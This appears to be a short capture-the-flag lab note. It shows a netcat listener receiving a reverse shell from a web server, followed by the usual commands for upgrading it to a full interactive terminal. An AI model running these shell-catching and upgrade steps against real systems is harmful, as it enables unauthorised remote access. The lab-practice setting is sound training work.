# dummy shell

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 1234                                            
listening on [any] 1234 ...
connect to [192.168.130.36] from (UNKNOWN) [10.64.144.72] 36194
/bin/sh: 0: can't access tty; job control turned off
$ ls
web.php
$ cd
$ cd ..
$ cd ..
$ ls
files
index.html
```
# upgrade

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@startup:/var/www/html$ ls
ls
files  index.html
www-data@startup:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@startup:/var/www/html$ ^Z
zsh: suspended  sudo nc -lvnp 1234
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg   
[1]  + continued  sudo nc -lvnp 1234

www-data@startup:/var/www/html$ ls
files  index.html
www-data@startup:/var/www/html$ pwd
/var/www/html
www-data@startup:/var/www/html$ ls 
files/      index.html  
www-data@startup:/var/www/html$ ls 
files/      index.html  
www-data@startup:/var/www/html$ ls 
```